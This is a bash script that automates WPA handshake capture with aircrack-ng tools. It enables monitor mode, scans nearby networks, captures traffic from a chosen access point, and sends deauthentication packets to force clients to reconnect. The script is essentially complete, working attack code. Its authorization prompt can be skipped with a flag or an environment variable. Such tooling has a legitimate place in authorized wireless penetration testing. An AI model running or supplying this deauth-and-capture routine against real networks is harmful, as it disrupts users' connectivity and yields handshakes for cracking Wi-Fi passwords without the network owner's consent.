#!/bin/bash
# scan_wifi.sh - WPA handshake capture helper for authorized Wi-Fi tests.
set -euo pipefail

INTERFACE="wlan0"
OUTPUT_DIR="wifi_captures"
CHANNEL=6
CAPTURE_TIME=20
DEAUTH_COUNT=5
BSSID=""
ESSID=""
NON_INTERACTIVE=false
DRY_RUN=false
ASSUME_AUTHORIZED="${SCRIPTING_ASSUME_AUTHORIZED:-false}"

usage() {
    local exit_code="${1:-1}"
    cat <<EOF >&2
Usage: $0 [options]
  -i interface             Wi-Fi interface (default: $INTERFACE)
  -c channel               Wi-Fi channel (default: $CHANNEL)
  -o dir                   Output directory (default: $OUTPUT_DIR)
  -t seconds               Capture duration (default: $CAPTURE_TIME)
  -d count                 Deauth packet count (default: $DEAUTH_COUNT)
  -b bssid                 Target BSSID
  -e essid                 Target ESSID
  --bssid <bssid>          Target BSSID
  --essid <essid>          Target ESSID
  --non-interactive        Require --bssid and --essid
  --dry-run                Print planned actions without capturing
  --yes-i-am-authorized    Confirm explicit authorization
  --help                   Show this help
EOF
    exit "$exit_code"
}

require_authorization() {
    if [[ "$ASSUME_AUTHORIZED" == true ]]; then
        return 0
    fi

    if [[ ! -t 0 ]]; then
        echo "Authorization confirmation required. Re-run with --yes-i-am-authorized only for approved Wi-Fi tests." >&2
        exit 1
    fi

    read -rp "Type AUTHORIZED to confirm this Wi-Fi test is approved: " confirmation
    if [[ "$confirmation" != "AUTHORIZED" ]]; then
        echo "Aborted." >&2
        exit 1
    fi
}

while getopts "i:c:o:t:d:b:e:-:h" opt; do
    case $opt in
        i) INTERFACE="$OPTARG" ;;
        c) CHANNEL="$OPTARG" ;;
        o) OUTPUT_DIR="$OPTARG" ;;
        t) CAPTURE_TIME="$OPTARG" ;;
        d) DEAUTH_COUNT="$OPTARG" ;;
        b) BSSID="$OPTARG" ;;
        e) ESSID="$OPTARG" ;;
        -)
            case "$OPTARG" in
                bssid)
                    BSSID="${!OPTIND}"
                    OPTIND=$((OPTIND + 1))
                    ;;
                essid)
                    ESSID="${!OPTIND}"
                    OPTIND=$((OPTIND + 1))
                    ;;
                non-interactive)
                    NON_INTERACTIVE=true
                    ;;
                dry-run)
                    DRY_RUN=true
                    ;;
                yes-i-am-authorized)
                    ASSUME_AUTHORIZED=true
                    ;;
                help)
                    usage 0
                    ;;
                *)
                    usage
                    ;;
            esac
            ;;
        h|*) usage ;;
    esac
done
shift $((OPTIND - 1))

require_authorization

if [[ "$NON_INTERACTIVE" == true && ( -z "$BSSID" || -z "$ESSID" ) ]]; then
    echo "--bssid and --essid are required in non-interactive mode." >&2
    exit 1
fi

MONITOR_IF="${INTERFACE}mon"

if [[ "$DRY_RUN" == true ]]; then
    echo "DRY RUN: interface=$INTERFACE monitor=$MONITOR_IF channel=$CHANNEL output=$OUTPUT_DIR"
    echo "DRY RUN: BSSID=${BSSID:-interactive} ESSID=${ESSID:-interactive} deauth_count=$DEAUTH_COUNT capture_time=$CAPTURE_TIME"
    exit 0
fi

mkdir -p "$OUTPUT_DIR"
LOG_FILE="$OUTPUT_DIR/scan_wifi.log"
exec > >(tee -a "$LOG_FILE") 2>&1

if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root." >&2
    exit 1
fi

for cmd in airmon-ng airodump-ng aireplay-ng aircrack-ng; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        echo "Missing required tool: $cmd" >&2
        exit 1
    fi
done

echo "[*] Enabling monitor mode on $INTERFACE..."
airmon-ng start "$INTERFACE" >/dev/null

cleanup() {
    if [[ -n "${AIRDUMP_PID:-}" ]]; then
        kill "$AIRDUMP_PID" 2>/dev/null || true
    fi
    airmon-ng stop "$MONITOR_IF" >/dev/null || true
}
trap cleanup EXIT

echo "[*] Scanning available networks..."
timeout 20s airodump-ng "$MONITOR_IF"

if [[ -z "$BSSID" ]]; then
    read -rp "Target BSSID: " BSSID
fi
if [[ -z "$ESSID" ]]; then
    read -rp "Network ESSID: " ESSID
fi

echo "[*] Capturing handshake for $ESSID ($BSSID)..."
CAP_BASENAME="handshake_$(date +%Y%m%d_%H%M%S)"
airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$OUTPUT_DIR/$CAP_BASENAME" "$MONITOR_IF" &
AIRDUMP_PID=$!

sleep 5
echo "[*] Sending deauth packets to force a handshake..."
aireplay-ng --deauth "$DEAUTH_COUNT" -a "$BSSID" "$MONITOR_IF"

echo "[*] Waiting $CAPTURE_TIME seconds for handshake..."
sleep "$CAPTURE_TIME"
kill "$AIRDUMP_PID" 2>/dev/null || true

HANDSHAKE_FILE="$OUTPUT_DIR/${CAP_BASENAME}-01.cap"
if [[ -f "$HANDSHAKE_FILE" ]]; then
    echo "Handshake captured: $HANDSHAKE_FILE"
    echo "[*] Validating handshake..."
    if aircrack-ng -w /dev/null "$HANDSHAKE_FILE" >/dev/null; then
        echo "Handshake appears valid."
    else
        echo "Handshake validation failed." >&2
    fi
else
    echo "Handshake file not found." >&2
fi

echo "Log saved to $LOG_FILE"
